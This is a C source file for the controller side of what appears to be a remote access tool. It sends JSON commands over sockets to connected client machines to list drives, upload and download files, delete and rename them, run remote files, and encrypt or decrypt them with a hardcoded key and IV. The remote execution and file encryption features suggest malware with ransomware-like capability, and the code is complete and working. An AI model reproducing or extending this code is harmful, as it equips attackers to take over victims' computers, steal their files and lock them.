
#include <gui/file_explorer/fe_remote_operations.h>
#include <gui/file_explorer/fe_ui_manager.h>
#include <gui/file_explorer/fe_data_caching.h>
#include <gui/file_explorer/fe_custom_messages.h>
#include <service/network_service.h>
#include <helpers/utils.h>
#include <gui/log_page.h>
#include <stdlib.h>
#include <Shlwapi.h>
#include <stdio.h>

typedef struct
{
    int clientIndex;
    HWND hNotifyWnd;
    UINT uNotifyMsg;
    cJSON *jsonRequest;
    HTREEITEM hParentItem;
} NetworkThreadData;

typedef struct
{
    int clientIndex;
    HWND hNotifyWnd;
    BOOL isUpload;
    WCHAR remotePath[MAX_PATH];
    WCHAR localPath[MAX_PATH];
    cJSON *jsonMetadata;
} FileTransferThreadData;

static DWORD WINAPI GenericRequestThread(LPVOID lpParam);
static DWORD WINAPI FileTransferThread(LPVOID lpParam);
static void LaunchRequestThread(FileExplorerData *pData, UINT uNotifyMsg, cJSON *jsonRequest, HTREEITEM hParent);
static void LaunchFileTransferThread(FileExplorerData *pData, BOOL isUpload, LPCWSTR path1, LPCWSTR path2);

static const char *GetJsonString(cJSON *obj, const char *key)
{
    cJSON *item = cJSON_GetObjectItemCaseSensitive(obj, key);
    return (cJSON_IsString(item) && item->valuestring) ? item->valuestring : "N/A";
}

static void FileTransferProgressCallback(long long bytes_transferred, long long total_bytes, void *userData)
{
    FileTransferProgressInfo *progress = (FileTransferProgressInfo *)userData;
    if (progress)
    {
        progress->current = bytes_transferred;
        progress->total = total_bytes;

        FileTransferProgressInfo *progressCopy = (FileTransferProgressInfo *)malloc(sizeof(FileTransferProgressInfo));
        if (progressCopy)
        {
            *progressCopy = *progress;
            PostMessage(progress->hNotifyWnd, WM_APP_FE_TRANSFER_PROGRESS, 0, (LPARAM)progressCopy);
        }
    }
}

static DWORD WINAPI FileTransferThread(LPVOID lpParam)
{
    FileTransferThreadData *data = (FileTransferThreadData *)lpParam;
    if (!data)
        return 1;

    FileExplorerData *pDataCheck = (FileExplorerData *)GetWindowLongPtr(data->hNotifyWnd, GWLP_USERDATA);
    if (!IsWindow(data->hNotifyWnd) || !pDataCheck || pDataCheck->bShutdown)
    {
        PostLogMessage(L"FE: File transfer thread aborted (window closed). Cleaning up data.");
        if (data->jsonMetadata)
            cJSON_Delete(data->jsonMetadata);
        free(data);
        return 1;
    }

    EnterCriticalSection(&g_cs_clients);
    BOOL bClientDataValid = FALSE;
    SOCKET clientSocket = INVALID_SOCKET;
    LPCRITICAL_SECTION pClientSocketLock = NULL;
    int currentClientIndex = data->clientIndex;

    if (currentClientIndex >= 0 && currentClientIndex < MAX_CLIENTS && g_active_clients[currentClientIndex].isActive)
    {
        clientSocket = g_active_clients[currentClientIndex].socket;
        pClientSocketLock = &g_active_clients[currentClientIndex].cs_socket_access;
        bClientDataValid = (clientSocket != INVALID_SOCKET);
    }
    LeaveCriticalSection(&g_cs_clients);

    if (!bClientDataValid)
    {
        PostLogMessage(L"FE: File transfer aborted, client at index %d no longer valid (initial check).", data->clientIndex);

        FileTransferProgressInfo *progressResult = (FileTransferProgressInfo *)malloc(sizeof(FileTransferProgressInfo));
        if (progressResult)
        {
            ZeroMemory(progressResult, sizeof(FileTransferProgressInfo));
            progressResult->hNotifyWnd = data->hNotifyWnd;
            progressResult->isUpload = data->isUpload;

            LPCWSTR fileName = data->isUpload ? PathFindFileNameW(data->localPath) : PathFindFileNameW(data->remotePath);
            if (fileName)
            {
#ifndef __TINYC__
                wcscpy_s(progressResult->fileName, MAX_PATH, fileName);
#else
                snwprintf(progressResult->fileName, MAX_PATH, L"%ls", fileName);
#endif
            }
            PostMessage(data->hNotifyWnd, WM_APP_FE_TRANSFER_COMPLETE, 0, (LPARAM)progressResult);
        }
        goto cleanup_transfer_thread_data;
    }

    EnterCriticalSection(&g_cs_clients);

    if (currentClientIndex >= 0 && currentClientIndex < MAX_CLIENTS && g_active_clients[currentClientIndex].isActive &&
        g_active_clients[currentClientIndex].socket == clientSocket)
    {

        pClientSocketLock = &g_active_clients[currentClientIndex].cs_socket_access;
    }
    else
    {

        bClientDataValid = FALSE;
        PostLogMessage(L"FE: File transfer aborted, client at index %d (socket %d) no longer valid (re-validation before lock).",
                       currentClientIndex, clientSocket);
    }
    LeaveCriticalSection(&g_cs_clients);

    if (!bClientDataValid)
    {

        FileTransferProgressInfo *progressResult = (FileTransferProgressInfo *)malloc(sizeof(FileTransferProgressInfo));
        if (progressResult)
        {
            ZeroMemory(progressResult, sizeof(FileTransferProgressInfo));
            progressResult->hNotifyWnd = data->hNotifyWnd;
            progressResult->isUpload = data->isUpload;
            LPCWSTR fileName = data->isUpload ? PathFindFileNameW(data->localPath) : PathFindFileNameW(data->remotePath);
            if (fileName)
            {
#ifndef __TINYC__
                wcscpy_s(progressResult->fileName, MAX_PATH, fileName);
#else
                snwprintf(progressResult->fileName, MAX_PATH, L"%ls", fileName);
#endif
            }
            PostMessage(data->hNotifyWnd, WM_APP_FE_TRANSFER_COMPLETE, 0, (LPARAM)progressResult);
        }
        goto cleanup_transfer_thread_data;
    }

    EnterCriticalSection(pClientSocketLock);

    pDataCheck = (FileExplorerData *)GetWindowLongPtr(data->hNotifyWnd, GWLP_USERDATA);
    if (!IsWindow(data->hNotifyWnd) || !pDataCheck || pDataCheck->bShutdown)
    {
        PostLogMessage(L"FE: File transfer thread aborted (window closed while holding socket lock). Cleaning up data.");
        LeaveCriticalSection(pClientSocketLock);
        goto cleanup_transfer_thread_data;
    }

    BOOL transferSuccess = FALSE;
    FileTransferProgressInfo progressState;
    ZeroMemory(&progressState, sizeof(FileTransferProgressInfo));
    progressState.clientIndex = data->clientIndex;
    progressState.hNotifyWnd = data->hNotifyWnd;
    progressState.isUpload = data->isUpload;
    LPCWSTR currentFileName = data->isUpload ? PathFindFileNameW(data->localPath) : PathFindFileNameW(data->remotePath);
    if (currentFileName)
    {
#ifndef __TINYC__
        wcscpy_s(progressState.fileName, MAX_PATH, currentFileName);
#else
        snwprintf(progressState.fileName, MAX_PATH, L"%ls", currentFileName);
#endif
    }

    if (data->isUpload)
    {

        PostLogMessage(L"FE: Starting upload of local '%s' to remote directory '%s'", data->localPath, data->remotePath);
        cJSON *uploadCmd = cJSON_CreateObject();
        if (!uploadCmd)
        {
            PostLogMessage(L"FE: Failed to create JSON object for upload command.");
            goto end_transfer;
        }

        cJSON_AddStringToObject(uploadCmd, "command", "UPLOAD_FILE");
        char *remoteDestDirUtf8 = ConvertWCHARToCHAR(data->remotePath);
        char *localFileNameUtf8 = ConvertWCHARToCHAR(PathFindFileNameW(data->localPath));

        if (!remoteDestDirUtf8 || !localFileNameUtf8)
        {
            PostLogMessage(L"FE: Path conversion failed for upload command. Local: %s, Remote: %s", data->localPath, data->remotePath);
            if (remoteDestDirUtf8)
                free(remoteDestDirUtf8);
            if (localFileNameUtf8)
                free(localFileNameUtf8);
            cJSON_Delete(uploadCmd);
            goto end_transfer;
        }

        cJSON_AddStringToObject(uploadCmd, "dest_dir", remoteDestDirUtf8);
        cJSON_AddStringToObject(uploadCmd, "file_name", localFileNameUtf8);

        PostLogMessage(L"FE: Calling SendFileRequest for upload of '%s'", data->localPath);
        if (SendFileRequest(clientSocket, uploadCmd, data->localPath, FileTransferProgressCallback, &progressState))
        {
            PostLogMessage(L"FE: Upload of '%s' data initiated and completed sending from server side.", data->localPath);

            PacketType responseType;
            cJSON *responseJson = NULL;
            char *responseBinary = NULL;
            uint32_t responseBinarySize = 0;

            PostLogMessage(L"FE: Waiting for client response after upload initiation for '%s'.", data->localPath);
            if (ReceiveRequest(clientSocket, &responseType, &responseJson, &responseBinary, &responseBinarySize, NULL, NULL) && responseType == PACKET_TYPE_JSON)
            {
                cJSON *status = cJSON_GetObjectItem(responseJson, "status");
                if (cJSON_IsString(status) && strcmp(status->valuestring, "success") == 0)
                {
                    transferSuccess = TRUE;
                    PostLogMessage(L"FE: Client reported successful upload of '%s'.", data->localPath);
                }
                else
                {
                    PostLogMessage(L"FE: Client reported upload FAILED for '%s'. Status: %s. Message: %s",
                                   data->localPath,
                                   GetJsonString(responseJson, "status"),
                                   GetJsonString(responseJson, "message"));
                }
                cJSON_Delete(responseJson);
                if (responseBinary)
                    free(responseBinary);
            }
            else
            {
                PostLogMessage(L"FE: No valid JSON response or ReceiveRequest FAILED from client after upload initiation for '%s'. Last network error: %d", data->localPath, WSAGetLastError());
            }
        }
        else
        {
            PostLogMessage(L"FE: SendFileRequest FAILED for upload of '%s'. Network error: %d", data->localPath, WSAGetLastError());
        }
        cJSON_Delete(uploadCmd);
    }
    else
    {

        PostLogMessage(L"FE: Starting download of remote '%s' to local '%s'", data->remotePath, data->localPath);
        cJSON *downloadCmd = cJSON_CreateObject();
        if (!downloadCmd)
        {
            PostLogMessage(L"FE: Failed to create JSON object for download command.");
            goto end_transfer;
        }
        cJSON_AddStringToObject(downloadCmd, "command", "DOWNLOAD_FILE");
        char *remotePathUtf8 = ConvertWCHARToCHAR(data->remotePath);
        if (remotePathUtf8)
        {
            cJSON_AddStringToObject(downloadCmd, "path", remotePathUtf8);
            free(remotePathUtf8);
        }
        else
        {
            PostLogMessage(L"FE: Path conversion failed for download command.");
            cJSON_Delete(downloadCmd);
            goto end_transfer;
        }

        PostLogMessage(L"FE: Sending download request for '%s'.", data->remotePath);
        if (SendJsonRequest(clientSocket, downloadCmd))
        {
            PostLogMessage(L"FE: Download request for '%s' sent.", data->remotePath);
            PacketType responseType;
            cJSON *responseJson = NULL;
            char *fileData = NULL;
            uint32_t fileSize = 0;

            PostLogMessage(L"FE: Waiting for client response (file data) for download of '%s'.", data->remotePath);
            if (ReceiveRequest(clientSocket, &responseType, &responseJson, &fileData, &fileSize, FileTransferProgressCallback, &progressState))
            {
                cJSON *status = cJSON_GetObjectItem(responseJson, "status");
                if (cJSON_IsString(status) && strcmp(status->valuestring, "success") == 0)
                {
                    if (fileData || fileSize == 0)
                    {
                        FILE *outFile;
                        PostLogMessage(L"FE: Opening local file '%s' for writing.", data->localPath);
                        if (_wfopen_s(&outFile, data->localPath, L"wb") == 0 && outFile)
                        {
                            if (fileSize > 0)
                            {
                                if (fwrite(fileData, 1, fileSize, outFile) == fileSize)
                                {
                                    transferSuccess = TRUE;
                                    PostLogMessage(L"FE: Successfully downloaded '%s' (%u bytes) to '%s'.", data->remotePath, fileSize, data->localPath);
                                }
                                else
                                {
                                    PostLogMessage(L"FE: Failed to write downloaded data to local file '%s'. Fwrite returned less than expected.", data->localPath);
                                    _wremove(data->localPath);
                                }
                            }
                            else
                            {
                                transferSuccess = TRUE;
                                PostLogMessage(L"FE: Successfully downloaded 0-byte file '%s' to '%s'.", data->remotePath, data->localPath);
                            }
                            fclose(outFile);
                        }
                        else
                        {
                            PostLogMessage(L"FE: Failed to open local file '%s' for writing. Error: %d", data->localPath, GetLastError());
                        }
                    }
                    else
                    {
                        PostLogMessage(L"FE: Client reported success but provided no file data for '%s'.", data->remotePath);
                    }
                }
                else
                {
                    PostLogMessage(L"FE: Client reported download failed for '%s'. Status: %s. Message: %s", data->remotePath, GetJsonString(responseJson, "status"), GetJsonString(responseJson, "message"));
                }
                if (responseJson)
                    cJSON_Delete(responseJson);
                if (fileData)
                    free(fileData);
            }
            else
            {
                PostLogMessage(L"FE: No valid response (file data) from client after download request for '%s'. Network error or client disconnected.", data->remotePath);
            }
        }
        else
        {
            PostLogMessage(L"FE: SendJsonRequest failed for download of '%s'. Network error or client disconnected.", data->remotePath);
        }
        cJSON_Delete(downloadCmd);
    }

end_transfer:
    LeaveCriticalSection(pClientSocketLock);

    FileTransferProgressInfo *progressResult = (FileTransferProgressInfo *)malloc(sizeof(FileTransferProgressInfo));
    if (progressResult)
    {
        *progressResult = progressState;
        progressResult->total = transferSuccess ? progressState.total : 0;
        PostMessage(data->hNotifyWnd, WM_APP_FE_TRANSFER_COMPLETE, 0, (LPARAM)progressResult);
    }
    else
    {
        PostLogMessage(L"FE: Failed to allocate memory for final transfer result message.");
    }

cleanup_transfer_thread_data:
    if (data->jsonMetadata)
        cJSON_Delete(data->jsonMetadata);
    free(data);
    return 0;
}

static DWORD WINAPI GenericRequestThread(LPVOID lpParam)
{
    NetworkThreadData *data = (NetworkThreadData *)lpParam;
    if (!data)
        return 1;

    FileExplorerData *pDataCheck = (FileExplorerData *)GetWindowLongPtr(data->hNotifyWnd, GWLP_USERDATA);
    if (!IsWindow(data->hNotifyWnd) || !pDataCheck || pDataCheck->bShutdown)
    {
        PostLogMessage(L"FE: Worker thread aborted (window closed). Cleaning up request data.");
        if (data->jsonRequest)
            cJSON_Delete(data->jsonRequest);
        free(data);
        return 1;
    }

    EnterCriticalSection(&g_cs_clients);
    BOOL bClientDataValid = FALSE;
    SOCKET clientSocket = INVALID_SOCKET;
    LPCRITICAL_SECTION pClientSocketLock = NULL;
    int currentClientIndex = data->clientIndex;

    if (currentClientIndex >= 0 && currentClientIndex < MAX_CLIENTS && g_active_clients[currentClientIndex].isActive)
    {
        clientSocket = g_active_clients[currentClientIndex].socket;
        pClientSocketLock = &g_active_clients[currentClientIndex].cs_socket_access;
        bClientDataValid = (clientSocket != INVALID_SOCKET);
    }
    LeaveCriticalSection(&g_cs_clients);

    if (!bClientDataValid)
    {
        PostLogMessage(L"FE: GenericRequestThread aborted, client at index %d no longer valid (initial check).", data->clientIndex);
        if (IsWindow(data->hNotifyWnd) && ((FileExplorerData *)GetWindowLongPtr(data->hNotifyWnd, GWLP_USERDATA))->bShutdown == FALSE)
        {
            PostMessage(data->hNotifyWnd, WM_APP_FE_COMMAND_COMPLETE, 0, 0);
        }
        goto cleanup_generic_thread_data;
    }

    EnterCriticalSection(&g_cs_clients);

    if (currentClientIndex >= 0 && currentClientIndex < MAX_CLIENTS && g_active_clients[currentClientIndex].isActive &&
        g_active_clients[currentClientIndex].socket == clientSocket)
    {

        pClientSocketLock = &g_active_clients[currentClientIndex].cs_socket_access;
    }
    else
    {

        bClientDataValid = FALSE;
        PostLogMessage(L"FE: GenericRequestThread aborted, client at index %d (socket %d) no longer valid (re-validation before lock).",
                       currentClientIndex, clientSocket);
    }
    LeaveCriticalSection(&g_cs_clients);

    if (!bClientDataValid)
    {

        if (IsWindow(data->hNotifyWnd) && ((FileExplorerData *)GetWindowLongPtr(data->hNotifyWnd, GWLP_USERDATA))->bShutdown == FALSE)
        {
            PostMessage(data->hNotifyWnd, WM_APP_FE_COMMAND_COMPLETE, 0, 0);
        }
        goto cleanup_generic_thread_data;
    }

    EnterCriticalSection(pClientSocketLock);

    pDataCheck = (FileExplorerData *)GetWindowLongPtr(data->hNotifyWnd, GWLP_USERDATA);
    if (!IsWindow(data->hNotifyWnd) || !pDataCheck || pDataCheck->bShutdown)
    {
        PostLogMessage(L"FE: GenericRequestThread aborted (window closed while holding socket lock). Cleaning up data.");
        LeaveCriticalSection(pClientSocketLock);
        goto cleanup_generic_thread_data;
    }

    BOOL sendSuccess = SendJsonRequest(clientSocket, data->jsonRequest);
    if (!sendSuccess)
    {
        PostLogMessage(L"FE: SendJsonRequest failed for client %d. Error: %d", data->clientIndex, WSAGetLastError());
        LeaveCriticalSection(pClientSocketLock);

        goto cleanup_generic_thread_data;
    }

    LPARAM resultLParam = 0;

    if (data->uNotifyMsg == 0)
    {
        PostLogMessage(L"FE: Fire-and-forget command (EXEC) sent. Not waiting for client response.");

        LeaveCriticalSection(pClientSocketLock);
        goto cleanup_generic_thread_data;
    }

    PacketType packetType;
    cJSON *jsonResponse = NULL;
    char *binaryData = NULL;
    uint32_t binarySize = 0;

    pDataCheck = (FileExplorerData *)GetWindowLongPtr(data->hNotifyWnd, GWLP_USERDATA);
    if (!IsWindow(data->hNotifyWnd) || !pDataCheck || pDataCheck->bShutdown)
    {
        PostLogMessage(L"FE: Worker thread aborted (window closed before receiving response). Cleaning up request data.");
        LeaveCriticalSection(pClientSocketLock);
        goto cleanup_generic_thread_data;
    }

    if (ReceiveRequest(clientSocket, &packetType, &jsonResponse, &binaryData, &binarySize, NULL, NULL))
    {
        if (packetType == PACKET_TYPE_JSON && jsonResponse)
        {

            switch (data->uNotifyMsg)
            {
            case WM_APP_FE_UPDATE_DRIVES:
                resultLParam = (LPARAM)cJSON_DetachItemFromObjectCaseSensitive(jsonResponse, "drives");
                break;
            case WM_APP_FE_UPDATE_LISTVIEW:
                resultLParam = (LPARAM)jsonResponse;
                jsonResponse = NULL;
                break;
            case WM_APP_FE_UPDATE_TREE_CHILDREN:
            {
                cJSON *wrapper = cJSON_CreateObject();
                cJSON *items = cJSON_DetachItemFromObjectCaseSensitive(jsonResponse, "items");
                cJSON_AddItemToObject(wrapper, "items", items);
                cJSON_AddNumberToObject(wrapper, "hParent", (double)(ULONG_PTR)data->hParentItem);
                resultLParam = (LPARAM)wrapper;
                break;
            }
            default:
                break;
            }
        }
        if (jsonResponse)
            cJSON_Delete(jsonResponse);
        if (binaryData)
            free(binaryData);
    }
    else
    {
        PostLogMessage(L"FE: ReceiveRequest failed for client %d. Error: %d", data->clientIndex, WSAGetLastError());
    }

    LeaveCriticalSection(pClientSocketLock);

    pDataCheck = (FileExplorerData *)GetWindowLongPtr(data->hNotifyWnd, GWLP_USERDATA);

    if (IsWindow(data->hNotifyWnd) && pDataCheck && !pDataCheck->bShutdown)
    {

        if (data->uNotifyMsg == 0)
        {
            PostLogMessage(L"FE: Posting WM_APP_FE_COMMAND_COMPLETE (from GenericRequestThread, EXEC case).");
            PostMessage(data->hNotifyWnd, WM_APP_FE_COMMAND_COMPLETE, 0, 0);
        }
        else
        {

            PostLogMessage(L"FE: Posting specific UI update message (0x%X).", data->uNotifyMsg);
            PostMessage(data->hNotifyWnd, data->uNotifyMsg, 0, resultLParam);
        }
    }
    else
    {

        PostLogMessage(L"FE: Window closed before UI update could be posted (GenericRequestThread). Cleaning up result data.");
        if (resultLParam != 0 && data->uNotifyMsg != 0)
        {
            cJSON_Delete((cJSON *)resultLParam);
        }
    }

cleanup_generic_thread_data:
    if (data->jsonRequest)
        cJSON_Delete(data->jsonRequest);
    free(data);
    return 0;
}

static void LaunchRequestThread(FileExplorerData *pData, UINT uNotifyMsg, cJSON *jsonRequest, HTREEITEM hParent)
{
    if (pData->bShutdown)
    {
        cJSON_Delete(jsonRequest);
        PostLogMessage(L"FE: Request aborted, window shutting down.");
        return;
    }

    NetworkThreadData *data = calloc(1, sizeof(NetworkThreadData));
    if (!data)
    {
        cJSON_Delete(jsonRequest);
        PostLogMessage(L"FE: Failed to allocate memory for network thread data.");
        return;
    }

    data->clientIndex = pData->clientIndex;
    data->hNotifyWnd = pData->hMain;
    data->uNotifyMsg = uNotifyMsg;
    data->jsonRequest = jsonRequest;
    data->hParentItem = hParent;

    SetExplorerControlsEnabled(pData, FALSE);
    WCHAR loadingMsg[64];
    LoadStringW(g_hinst, IDS_FE_STATUS_LOADING, loadingMsg, _countof(loadingMsg));
    SendMessage(pData->hStatusBar, SB_SETTEXT, 0, (LPARAM)loadingMsg);
    PostLogMessage(L"FE: Launching GenericRequestThread for message 0x%X.", uNotifyMsg);

    HANDLE hThread = CreateThread(NULL, 0, GenericRequestThread, data, 0, NULL);
    if (hThread)
    {
        CloseHandle(hThread);
    }
    else
    {
        PostLogMessage(L"FE: Failed to create network request thread.");
        free(data);
        cJSON_Delete(jsonRequest);
        SetExplorerControlsEnabled(pData, TRUE);
        SendMessage(pData->hStatusBar, SB_SETTEXT, 0, (LPARAM)L"Error: Failed to launch request.");
    }
}

static void LaunchFileTransferThread(FileExplorerData *pData, BOOL isUpload, LPCWSTR path1, LPCWSTR path2)
{
    if (pData->bShutdown)
    {
        PostLogMessage(L"FE: File transfer aborted, window shutting down.");
        return;
    }

    FileTransferThreadData *data = calloc(1, sizeof(FileTransferThreadData));
    if (!data)
    {
        PostLogMessage(L"FE: Failed to allocate memory for file transfer thread data.");
        return;
    }

    data->clientIndex = pData->clientIndex;
    data->hNotifyWnd = pData->hMain;
    data->isUpload = isUpload;

    if (isUpload)
    {
#ifndef __TINYC__
        wcscpy_s(data->localPath, MAX_PATH, path1);
        wcscpy_s(data->remotePath, MAX_PATH, path2);
#else
        snwprintf(data->localPath, MAX_PATH, L"%ls", path1);
        snwprintf(data->remotePath, MAX_PATH, L"%ls", path2);
#endif
        PostLogMessage(L"FE: Preparing upload of '%s' to '%s'", data->localPath, data->remotePath);
    }
    else
    {
#ifndef __TINYC__
        wcscpy_s(data->remotePath, MAX_PATH, path1);
        wcscpy_s(data->localPath, MAX_PATH, path2);
#else
        snwprintf(data->remotePath, MAX_PATH, L"%ls", path1);
        snwprintf(data->localPath, MAX_PATH, L"%ls", path2);
#endif
        PostLogMessage(L"FE: Preparing download of '%s' to '%s'", data->remotePath, data->localPath);
    }

    SetExplorerControlsEnabled(pData, FALSE);
    WCHAR initialStatus[512], fmt[128];
    UINT fmt_id = isUpload ? IDS_FE_STATUS_UPLOADING_FMT : IDS_FE_STATUS_DOWNLOADING_FMT;
    LoadStringW(g_hinst, fmt_id, fmt, _countof(fmt));
    swprintf_s(initialStatus, ARRAYSIZE(initialStatus), fmt, PathFindFileNameW(isUpload ? data->localPath : data->remotePath), 0LL, 0LL, 0.0);
    SendMessageW(pData->hStatusBar, SB_SETTEXTW, 0, (LPARAM)initialStatus);
    PostLogMessage(L"FE: Launching FileTransferThread (Upload: %d).", isUpload);

    HANDLE hThread = CreateThread(NULL, 0, FileTransferThread, data, 0, NULL);
    if (hThread)
    {
        CloseHandle(hThread);
    }
    else
    {
        PostLogMessage(L"FE: Failed to create file transfer thread.");
        free(data);
        SetExplorerControlsEnabled(pData, TRUE);
        SendMessage(pData->hStatusBar, SB_SETTEXT, 0, (LPARAM)L"Error: Failed to launch transfer.");
    }
}

void RequestDrives(FileExplorerData *pData)
{
    cJSON *cmd = cJSON_CreateObject();
    cJSON_AddStringToObject(cmd, "command", "GET_DRIVES");
    LaunchRequestThread(pData, WM_APP_FE_UPDATE_DRIVES, cmd, NULL);
}

void RequestDirectoryListing(FileExplorerData *pData, LPCWSTR pszPath)
{

    cJSON *cachedJson = GetFromCache(pData, pszPath);
    if (cachedJson)
    {

        SetExplorerControlsEnabled(pData, FALSE);
        SendMessage(pData->hStatusBar, SB_SETTEXT, 0, (LPARAM)L"Loading from cache...");

        PostMessage(pData->hMain, WM_APP_FE_UPDATE_LISTVIEW, 0, (LPARAM)cachedJson);
        PostLogMessage(L"FE: Directory listing for '%s' served from cache.", pszPath);
        return;
    }

    char *pathUtf8 = ConvertWCHARToCHAR(pszPath);
    if (!pathUtf8)
    {
        PostLogMessage(L"FE: Error converting path to UTF-8: %s", pszPath);
        return;
    }

    cJSON *cmd = cJSON_CreateObject();
    cJSON_AddStringToObject(cmd, "command", "LIST");
    cJSON_AddStringToObject(cmd, "path", pathUtf8);
    cJSON_AddBoolToObject(cmd, "show_hidden", pData->bShowHidden);
    free(pathUtf8);

    LaunchRequestThread(pData, WM_APP_FE_UPDATE_LISTVIEW, cmd, NULL);
}

void RequestTreeChildren(FileExplorerData *pData, HTREEITEM hParentItem)
{
    LPCWSTR path = (LPCWSTR)TreeView_GetItemParam(pData->hTreeView, hParentItem);
    if (!path)
    {
        PostLogMessage(L"FE: No path associated with TreeView item for children request.");
        return;
    }
    char *pathUtf8 = ConvertWCHARToCHAR(path);
    if (!pathUtf8)
    {
        PostLogMessage(L"FE: Error converting TreeView path to UTF-8: %s", path);
        return;
    }

    cJSON *cmd = cJSON_CreateObject();
    cJSON_AddStringToObject(cmd, "command", "LIST");
    cJSON_AddStringToObject(cmd, "path", pathUtf8);
    cJSON_AddBoolToObject(cmd, "show_hidden", pData->bShowHidden);
    free(pathUtf8);

    LaunchRequestThread(pData, WM_APP_FE_UPDATE_TREE_CHILDREN, cmd, hParentItem);
}

void RequestFileExecution(FileExplorerData *pData, LPCWSTR pszPath)
{
    char *pathUtf8 = ConvertWCHARToCHAR(pszPath);
    if (!pathUtf8)
    {
        PostLogMessage(L"FE: Error converting execution path to UTF-8: %s", pszPath);
        return;
    }

    cJSON *cmd = cJSON_CreateObject();
    cJSON_AddStringToObject(cmd, "command", "EXEC");
    cJSON_AddStringToObject(cmd, "path", pathUtf8);
    free(pathUtf8);

    RemoveFromCache(pData, pData->szCurrentPath);
    LaunchRequestThread(pData, WM_APP_FE_REFRESH_VIEW, cmd, NULL);
}

void RequestFileDeletion(FileExplorerData *pData, LPCWSTR pszPath)
{
    char *pathUtf8 = ConvertWCHARToCHAR(pszPath);
    if (!pathUtf8)
    {
        PostLogMessage(L"FE: Error converting deletion path to UTF-8: %s", pszPath);
        return;
    }

    cJSON *cmd = cJSON_CreateObject();
    cJSON_AddStringToObject(cmd, "command", "DELETE");
    cJSON_AddStringToObject(cmd, "path", pathUtf8);
    free(pathUtf8);

    RemoveFromCache(pData, pData->szCurrentPath);

    LaunchRequestThread(pData, WM_APP_FE_REFRESH_VIEW, cmd, NULL);
}

void RequestFileRename(FileExplorerData *pData, LPCWSTR pszOldPath, LPCWSTR pszNewPath)
{
    char *oldPathUtf8 = ConvertWCHARToCHAR(pszOldPath);
    char *newPathUtf8 = ConvertWCHARToCHAR(pszNewPath);
    if (!oldPathUtf8 || !newPathUtf8)
    {
        PostLogMessage(L"FE: Error converting rename paths to UTF-8. Old: %s, New: %s", pszOldPath, pszNewPath);
        free(oldPathUtf8);
        free(newPathUtf8);
        return;
    }

    cJSON *cmd = cJSON_CreateObject();
    cJSON_AddStringToObject(cmd, "command", "RENAME");
    cJSON_AddStringToObject(cmd, "old_path", oldPathUtf8);
    cJSON_AddStringToObject(cmd, "new_path", newPathUtf8);
    free(oldPathUtf8);
    free(newPathUtf8);

    RemoveFromCache(pData, pData->szCurrentPath);

    LaunchRequestThread(pData, WM_APP_FE_REFRESH_VIEW, cmd, NULL);
}

void RequestFileEncryption(FileExplorerData *pData, LPCWSTR pszPath)
{
    char *pathUtf8 = ConvertWCHARToCHAR(pszPath);
    if (!pathUtf8)
    {
        PostLogMessage(L"FE: Error converting encryption path to UTF-8: %s", pszPath);
        return;
    }

    cJSON *cmd = cJSON_CreateObject();
    cJSON_AddStringToObject(cmd, "command", "ENCRYPT");
    cJSON_AddStringToObject(cmd, "path", pathUtf8);
    cJSON_AddStringToObject(cmd, "key", "LETITCONTINUEBRO");
    cJSON_AddStringToObject(cmd, "iv", "ORBEUNITNOCTITEL");
    free(pathUtf8);

    RemoveFromCache(pData, pData->szCurrentPath);

    LaunchRequestThread(pData, WM_APP_FE_REFRESH_VIEW, cmd, NULL);
}

void RequestFileDecryption(FileExplorerData *pData, LPCWSTR pszPath)
{
    char *pathUtf8 = ConvertWCHARToCHAR(pszPath);
    if (!pathUtf8)
    {
        PostLogMessage(L"FE: Error converting decryption path to UTF-8: %s", pszPath);
        return;
    }

    cJSON *cmd = cJSON_CreateObject();
    cJSON_AddStringToObject(cmd, "command", "DECRYPT");
    cJSON_AddStringToObject(cmd, "path", pathUtf8);
    cJSON_AddStringToObject(cmd, "key", "LETITCONTINUEBRO");
    cJSON_AddStringToObject(cmd, "iv", "ORBEUNITNOCTITEL");
    free(pathUtf8);

    RemoveFromCache(pData, pData->szCurrentPath);

    LaunchRequestThread(pData, WM_APP_FE_REFRESH_VIEW, cmd, NULL);
}

void RequestFileUpload(FileExplorerData *pData, LPCWSTR pszLocalPath, LPCWSTR pszRemoteDestDir)
{
    RemoveFromCache(pData, pszRemoteDestDir);
    LaunchFileTransferThread(pData, TRUE, pszLocalPath, pszRemoteDestDir);
}

void RequestFileDownload(FileExplorerData *pData, LPCWSTR pszRemotePath, LPCWSTR pszLocalDestPath)
{
    LaunchFileTransferThread(pData, FALSE, pszRemotePath, pszLocalDestPath);
}